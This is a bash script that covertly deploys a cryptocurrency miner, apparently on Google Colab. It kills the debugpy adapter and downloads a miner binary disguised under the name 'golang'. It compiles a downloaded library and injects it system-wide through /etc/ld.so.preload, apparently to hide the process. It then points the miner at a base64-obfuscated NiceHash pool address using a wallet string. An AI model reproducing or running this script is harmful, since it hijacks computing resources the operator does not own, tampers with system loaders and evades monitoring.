#!/bin/bash

DebugPID=$(ps -ef | grep '/usr/bin/python3 /usr/local/lib/python3.7/dist-packages/debugpy/adapter' | grep -v 'grep' | awk '{ printf $2 }')
pkill $DebugPID

golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
libgolang=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c

userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
key=ZXRoYXNo

seed=$(echo $string | base64 --decode)
apikey=$(echo $key | base64 --decode)


sudo apt-get install -y libpci-dev gcc

wget $golang
wget $libgolang


gcc -Wall -fPIC -shared -o libgolang.so libgolang.c -ldl
sudo mv libgolang.so /usr/local/lib/
echo /usr/local/lib/libgolang.so >> /etc/ld.so.preload

chmod 777 golang

./golang -a $apikey --url $seed -u $userAgent -p x 
